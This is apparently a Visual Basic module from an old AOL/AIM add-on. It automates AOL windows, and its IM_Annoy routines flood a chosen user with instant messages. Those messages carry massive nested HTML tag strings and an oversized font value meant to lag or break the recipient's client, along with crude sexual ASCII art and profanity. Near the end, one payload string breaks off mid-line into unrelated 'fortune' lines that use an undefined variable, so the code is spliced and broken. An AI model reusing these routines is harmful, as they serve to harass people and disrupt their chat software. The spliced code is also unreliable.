BoldSendChat ("::::: /¯¯,¯¯\ |¯¯¯|_|¯¯'| |\¯¯ (/\)¯¯ /|' /¯¯,¯¯\ |\¯¯¯-¯):::::")
TimeOut (0.5)
BoldSendChat (":::::|\____ /|'|\______/|  \ \__/\__/ / |\____ /|' \|__|¯|°:::::")
TimeOut (0.5)
BoldSendChat ("::::: \|___ |/° \|_____|/::::\|_|/'\|_|/::::\|___ |/°: |__|:::¯::::  ")
TimeOut (0.5)
BoldSendChat (":::::::::::::::::::::.........:::::...........::::........::::.....:::::::")
TimeOut (0.5)
BoldSendChat (":::::::._¸,.-·´¨¯¨`·.,¸_/¯)) Òù(/\)òP ((¯\ _¸,.-·´¨¯¨`·,¸_::...:.   ")
TimeOut (0.5)
BoldSendChat (":::::::: ((¯\ _¸,.-·´¨¯¨`·,¸_.oO()Oo _¸,.-·´¨¯¨`·.,¸_/¯)):::::::.   .   ")
TimeOut (0.5)

End Sub


Sub SetText(window, Text)
'pack dat gat wop b back
eltext% = SendMessageByString(window, WM_SETTEXT, 0, "")
eltext% = SendMessageByString(window, WM_SETTEXT, 0, Text)
End Sub

Sub Keyword40(keyword)
Aol40% = AOLWindow
MDI40% = AOL4_MDI
Do:
DoEvents
Tool1% = FindChildByClass(Aol40%, "AOL Toolbar")
Tool2% = FindChildByClass(Tool1%, "_AOL_Toolbar")
e% = FindChildByClass(Tool2%, "_AOL_Glyph")
e1% = GetWindow(e%, 2)
e2% = GetWindow(e1%, 2)
e3% = GetWindow(e2%, 2)
e4% = GetWindow(e3%, 2)
e5% = GetWindow(e4%, 2)
e6% = GetWindow(e5%, 2)
If Tool1% <> 0 And Tool2% <> 0 And e% <> 0 And e1% <> 0 And e2% <> 0 And e3% <> 0 And e4% <> 0 And e5% <> 0 And e6% <> 0 Then Exit Do
Loop
cLickiCoN (e6%)

Do:
DoEvents
Chill% = FindChildByTitle(MDI40%, "Keyword")
edit% = FindChildByClass(Chill%, "_AOL_Edit")
ICcD% = FindChildByClass(Chill%, "_AOL_Icon")
If Chill% <> 0 And edit% <> 0 And ICcD% <> 0 Then Exit Do
Loop
pause 0.1
Call SetText(edit%, keyword)
Do: DoEvents
    Chill% = FindChildByTitle(MDI40%, "Keyword")
    Call cLickiCoN(ICcD%)
Loop Until Chill% = 0
End Sub



Sub SendBuddyInvitation(Person, message, room)
'Ouwop
MDI% = AOL4_MDI
o% = FindChildByTitle(MDI%, "Buddy List Window")
If o% <> 0 Then GoTo JOe
XAOL4_Keyword "bv"
Do:
DoEvents
JOe:
BuddyBox% = FindChildByTitle(MDI%, "Buddy List Window")
Ico1% = FindChildByClass(BuddyBox%, "_AOL_Icon")
ico2% = GetWindow(Ico1%, 2)
Ico3% = GetWindow(ico2%, 2)
Ico4% = GetWindow(Ico3%, 2)
Ico5% = GetWindow(Ico4%, 2)
Ico6% = GetWindow(Ico5%, 2)
Ico7% = GetWindow(Ico6%, 2)
pause 0.1
cLickiCoN (Ico7%)
If BuddyBox% <> 0 And Ico7% <> 0 Then Exit Do
Loop
Do:
DoEvents
BuddyChat% = FindChildByTitle(MDI%, "Buddy Chat")
WhoToInvite% = FindChildByClass(BuddyChat%, "_AOL_Edit")
MsgToSend% = GetWindow(WhoToInvite%, 2)
w1% = GetWindow(MsgToSend%, 2)
w2% = GetWindow(w1%, 2)
w3% = GetWindow(w2%, 2)
w4% = GetWindow(w3%, 2)
Roomer% = GetWindow(w4%, 2)
If BuddyChat% <> 0 And WhoToInvite% <> 0 And MsgToSend% <> 0 And Roomer% <> 0 Then Exit Do
Loop
Call SetText(WhoToInvite%, Person)
Call SetText(MsgToSend%, message)
Call SetText(Roomer%, room)
pause 0.1
SendBut% = FindChildByClass(BuddyChat%, "_AOL_Icon")
cLickiCoN (SendBut%)
'Closewindow(BuddyChat%)
End Sub



Public Sub Closer(hwnd As Long)
    Call SendMessageLong(hwnd&, WM_CLOSE, 0&, 0&)
'closes the window you want to close
End Sub

Public Sub IconC(AOIcon As Long)
    Dim aoI As Long
    aoI& = SendMessage(AOIcon&, WM_LBUTTONDOWN, 0&, 0&)
    aoI& = SendMessage(AOIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub ShowWelcomeWindow()
    Dim AOL As Long, wel As Long, MDI As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    wel& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    SeeWindow (wel&)
End Sub

Public Sub SeeWindow(hwnd As Long)
Call ShowWindow(hwnd&, SW_SHOW)
'shows a hidden window
End Sub

Public Sub HideWelcomeWindow()
    Dim AOL As Long, wel As Long, MDI As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    wel& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
HideWindow (wel&)

End Sub
Public Sub Killwelcome()
Call AOL4_KillWin(wel&)
End Sub

Public Sub HideWindow(hwnd As Long)
    Call ShowWindow(hwnd&, SW_HIDE)
End Sub
Public Sub Form_Implode(Form As Form, Movement As Integer)

    Dim myRect As RECT
    Dim formWidth As Integer, formHeight As Integer
    Dim i As Integer, X As Integer
    Dim Y As Integer, cx As Integer, cy As Integer
    Dim TheScreen As Long, Brush As Long
    GetWindowRect Form.hwnd, myRect
        formWidth% = (myRect.Right - myRect.Left)
        formHeight% = myRect.Bottom - myRect.top
            TheScreen& = GetDC(0)
            Brush& = CreateSolidBrush(Form.BackColor)
            For i% = Movement% To 1 Step -1
                cx% = formWidth% * (i% / Movement%)
                cy% = formHeight% * (i% / Movement%)
                X% = myRect.Left + (formWidth% - cx%) / 2
                Y% = myRect.top + (formHeight% - cy%) / 2
                Rectangle TheScreen&, X%, Y%, X% + cx%, Y% + cy%
            Next i%
                X% = ReleaseDC(0, TheScreen&)
                DeleteObject (Brush&)
End Sub

Public Sub Form_TighTExit(Form As Form)
    Dim sstart As Integer, GoNow As Long
    GoNow& = Form.Height / 2
    For sstart% = 1 To GoNow&
    DoEvents
        Form.Height = Form.Height - 10
        Form.top = (Screen.Height - Form.Height) \ 2
        If Form.Height <= 11 Then GoTo Finish
    Next sstart%
Finish:
        Form.Height = 30
        GoNow& = Form.Width / 2
    For sstart% = 1 To GoNow&
    DoEvents
        Form.Width = Form.Width - 10
        Form.Left = (Screen.Width - Form.Width) \ 2
        If Form.Width <= 11 Then Exit Sub
    Next sstart%
    Unload Form
End Sub

Public Sub Form_Explode(Form As Form, Movement As Integer)
    Dim myRect As RECT
    Dim formWidth As Integer, formHeight As Integer, i As Integer
    Dim X As Integer, Y As Integer
    Dim cx As Integer, cy As Integer
    Dim TheScreen As Long, Brush As Long
    GetWindowRect Form.hwnd, myRect
        formWidth% = (myRect.Right - myRect.Left)
        formHeight% = myRect.Bottom - myRect.top
            TheScreen& = GetDC(0)
            Brush& = CreateSolidBrush(Form.BackColor)
            For i% = 1 To Movement%
                cx% = formWidth * (i% / Movement%)
                cy% = formHeight * (i% / Movement%)
                X% = myRect.Left + (formWidth% - cx%) / 2
                Y = myRect.top + (formHeight% - cy%) / 2
                Rectangle TheScreen, X%, Y%, X% + cx%, Y% + cy%
            Next i%
                X% = ReleaseDC(0, TheScreen&)
                DeleteObject (Brush&)
End Sub

Public Sub AIM_ImReply(stMessage As String)
    On Error Resume Next
   If findiM Then
   Call AIM_RespondA(stMessage$)
   TimeOut (0.8)
   BoldSendChat (AIM_ImFromWho + " Responded Sating: " + AIM_ImText)
   AIM_CloseIM
   End If
End Sub

Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)

GetClass = buffer$
End Function
Sub IM_Annoy(sn)
'ouwop
If sn = "" Then
MsgBox "Pleaze Select Someone TO IM-Annoy!", vbCritical, "ERROR!"
Else
Dim sPrompt As String
Static iXPos As Integer, iYPos As Integer
sPrompt = "Enta What to Say In da IM-Annoy!"
Stitle = "What to say in IM"
spre = "..."
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X

sName = InputBox$(sPrompt, Stitle, spre, iXPos, iYPos)
If sName = "" Then
Else
se$ = " <font color=#ff3300><B><font size=2>" & getuser & "</b><font color=#g>:" & Chr(9)
darg$ = Chr(9) & "MazTa" & Chr(13) & se$ & "Progg" & Chr(13) & se$ & "Ownz" & Chr(13) & se$ & "You" & Chr(13) & se$ & "Fo0!"

jerk$ = "<BODY BGCOLOR=#fffffe></html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><<h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D~~~~~</html><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
Erro$ = "<BODY BGCOLOR=#fffffe></P><P ALIGN=CENTER>Ouwopz MazTa ProgG <font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999><i><u><b>Error"
lag$ = "<BODY BGCOLOR=#fffffe><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1>"
Line$ = "<BODY BGCOLOR=#fffffe><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
dot$ = "<BODY BGCOLOR=#fffffe><h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>."
Colord$ = "<BODY BGCOLOR=#fffffe><BODY BGCOLOR=#00ff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0sff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#0fff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#000f00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ff0f><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0fff0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#f0f0f0><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#00ffff><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><BODY BGCOLOR=#fffff0><h3><h2><h3><h2><h3><h2>"
Wave$ = "<BODY BGCOLOR=#fffffe><HTML><PRE>   <FONT SIZE=5 <FONT COLOR=#00ff00><BODY BGCOLOR=#000000></sup>_<sup>_</sup>_<suP>_</sup>_<sup><suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>_</sup>_<suP>_</sup>_<sup>_</sup>_<sup>"
shake$ = "<BODY BGCOLOR=#fffffe><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html>MazTa</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html> ProGG"
Call sendim(sn, "<font color=#fffffe>" + perK$ + "<font color=#gggggg>" + sName + "<font color=#fffffe>AAAAAAAAAAAAA")
TimeOut (1.5)
Call IManswer("<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.")
  TimeOut (2.5)
wait4blankIM
Call IManswer(darg$)
  TimeOut (2.5)
  wait4blankIM
Call IManswer(Colord$)
  TimeOut (2.5)
  wait4blankIM
Call IManswer(darg$)
  TimeOut (2.5)
  wait4blankIM
Call IManswer(Line$)
  TimeOut (2.5)
  wait4blankIM
Call IManswer(Colord$ & perK$)
  TimeOut (2.5)
  wait4blankIM
Call IManswer("<font color=#fffffe>" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "<font color=#gggggg>" + sName + "<font color=#fffffe>" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "" + perK$ + "")
  TimeOut (2.5)
  wait4blankIM
Call IManswer(Colord$)
  TimeOut (2.5)
  wait4blankIM
End If
End If

End Sub
Sub IM_Annoy_AIM(Perzon$)

If Perzon$ = "" Then
MsgBox "Pleaze Select Someone TO IM-Annoy!", vbCritical, "ERROR!"
Else

Dim sPrompt As String
Static iXPos As Integer, iYPos As Integer
sPrompt = "Enta What to Say In da IM-Annoy!"
Stitle = "What to say in IM"
spre = "Fuck You"
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X

sName = InputBox$(sPrompt, Stitle, spre, iXPos, iYPos)
If sName = "" Then
Else

jerk$ = "<BODY BGCOLOR=#fffffe></html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D</html><h1>8=jjjj===D</html><<h1>8==jjjj==D</html><h1>8===jjjj=D</html><h1>8====jjjjD</html><h1>8===jjjj=D</html><h1>8==jjjj==D</html><h1>8=jjjj===D</html><h1>8jjjj====D~~~~~</html><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
Erro$ = "<BODY BGCOLOR=#fffffe></P><P ALIGN=CENTER>Ouwopz MazTa ProgG <font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999><i><u><b>Error"
lag$ = "<BODY BGCOLOR=#fffffe><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1><h3><h2><h1>"
Line$ = "<BODY BGCOLOR=#fffffe><s><u><b><p><h3><h3><h3><h3><h3><u><h3><h3><h3><h3><h3><h3><h3><h3><u><h3><h3><h3><h3><h3><h3><h3><h3><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><u><u><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
dot$ = "<BODY BGCOLOR=#fffffe><h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>.<h3>."
Colord$ = "<BODY BGCOLOR=#fffffe><BODY BGCOLOR=#00ff00><h3><h2><h3><h2><h3><h2><h3><h2><h3><h2><h3>e azz tonight!"
If Dis = 6 Then d$ = ", You'LL recieve bad Nooze today"
If Dis = 7 Then d$ = ", Somethings gonna happen to your comp BAD!"
If Dis = 8 Then d$ = ", Youll finally git da Upgrade you alwayz Wanted!"
If Dis = 9 Then d$ = ", Ouwop will be your friend!"
If Dis = 10 Then d$ = ", 1 day you wiLL own Something Valuble"
If Dis = 11 Then d$ = ", Da 1 you Love will Love you MORE!"
If Dis = 12 Then d$ = ", Da 1 you Love will Hate You So0N"
If Dis = 13 Then d$ = ", Youll Lo0ze money so0N"
If Dis = 14 Then d$ = ", YouLL DiE froM No-SeX So0N"
If Dis = 15 Then d$ = ", YouR NuTTz wiLL tern Blue So0N"
If Dis = 16 Then d$ = ", You will Masturbate in about 10 Minutez!"
If Dis = 17 Then d$ = ", You'll meet some1 today!"
If Dis = 18 Then d$ = ", You'LL find out dat 2-Pac iz really ALive so0N!"
If Dis = 19 Then d$ = ", Your Hard Drive wiLL Amazinly lo0ze all itz space!"
If Dis = 20 Then d$ = ", Your CPU will go from a 686 to a 386~"
If Dis = 21 Then d$ = ", Your having a baby in your life soon!"
If Dis = 22 Then d$ = ", YouLL have a run in with a GUIDEwatch So0n"
If Dis = 23 Then d$ = ", YouLL have a run in wit a CATWatch so0n"
